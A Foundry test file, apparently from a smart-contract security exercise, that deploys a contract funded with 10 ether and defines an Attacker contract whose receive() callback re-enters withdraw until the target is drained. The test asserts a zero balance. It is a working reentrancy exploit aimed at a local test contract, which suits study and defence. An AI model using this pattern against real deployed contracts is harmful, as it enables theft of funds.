// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Reentrancy} from "../src/Reentrancy.sol";

contract ReentrancyTest is Test {
    Reentrancy target;
    address player;
    Attacker attacker;

    function setUp() public {
        target = new Reentrancy();

        // contract has 10 ether initiailly
        payable(address(target)).transfer(10 ether);

        // player starts with 1 ether
        player = makeAddr("player");
        vm.deal(player, 1 ether);
    }

    function attack() private {
        attacker = new Attacker(payable(target));
        attacker.attack{value: 1 ether}();
        attacker.withdraw();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(address(target).balance, 0, "target must be drained");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy target;
    address owner;
    uint256 value = 0.001 ether;

    constructor(address payable _target) payable {
        target = Reentrancy(_target);
        owner = msg.sender;
    }

    // gets the money from out of the contract to the player
    function withdraw() public {
        require(msg.sender == owner, "only the owner can withdraw");
        (bool sent,) = owner.call{value: address(this).balance}("");
        require(sent, "failed to withdraw");
    }

    function attack() public payable {
        require(msg.value >= value);
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
        value = msg.value;
    }

    receive() external payable {
        uint256 targetBalance = address(target).balance;
        if (targetBalance >= value) {
            // withdraw at most your balance at a time
            target.withdraw(value);
        } else if (targetBalance != 0) {
            // withdraw the remaining positive balance in the contract
            target.withdraw(targetBalance);
        }
    }
}
